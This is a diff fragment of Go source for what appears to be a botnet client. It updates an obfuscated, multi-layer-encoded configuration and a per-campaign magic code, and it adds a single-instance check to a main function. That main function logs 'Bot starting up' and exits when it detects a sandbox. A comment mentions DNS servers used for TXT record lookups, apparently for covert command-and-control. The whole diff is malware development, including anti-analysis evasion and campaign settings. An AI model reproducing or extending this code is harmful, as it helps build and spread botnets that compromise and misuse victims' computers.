@@ -20,8 +20,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "EkAJ9ezFRv5FSEL8HHtago45a2YlS4HUWLqwNIg=" //change me run setup.py
-const cryptSeed = "292ae3aa"                                //change me run setup.py
+const gothTits = "SIyINwct4TOaRS5FVh6/Z48967ZseBmWcQTYE7fo=" //change me run setup.py
+const cryptSeed = "f9709f44"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -48,8 +48,8 @@ func deoxys(format string, args ...interface{}) {
 }
 
 const (
-	magicCode       = "y67%@uu60zz77yCQ" //change this per campaign
-	protocolVersion = "v3.8"          //change this per campaign
+	magicCode       = "a^*wkvd&ZZarzd6h" //change this per campaign
+	protocolVersion = "proto50"          //change this per campaign
 )
 
 var (
@@ -227,6 +227,7 @@ func machete(cmd string, conn net.Conn) error {
 func main() {
 	deoxys("main: Bot starting up...")
 	deoxys("main: Protocol version: %s", protocolVersion)
+	revilSingleInstance()
 	if winnti() {
 		deoxys("main: Sandbox detected, exiting")
 		os.Exit(200)
